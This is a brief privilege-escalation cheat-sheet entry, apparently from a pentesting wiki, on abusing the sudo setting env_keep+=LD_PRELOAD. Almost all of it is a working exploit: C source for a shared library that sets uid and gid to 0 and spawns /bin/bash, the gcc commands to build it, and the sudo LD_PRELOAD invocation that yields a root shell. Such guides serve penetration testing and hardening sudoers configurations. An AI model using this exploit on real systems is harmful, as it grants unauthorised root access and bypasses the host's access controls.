# Compiling

### LD\_PRELOAD

If you find inside the output of **`sudo -l`** the sentence: _**env\_keep+=LD\_PRELOAD**_ and you can call some command with sudo, you can escalate privileges.

```
Defaults        env_keep += LD_PRELOAD
```

Save as **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```



Then **compile it** using:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Finally, **escalate privileges** running. Try full path in LD\_PRELOAD=

```bash
sudo LD_PRELOAD=pe.so <COMMAND>
```

If system doesnt have gcc you can cross compile

```
gcc ldpreload.c -o rootshell -fPIC -shared -nostartfiles -w 
```

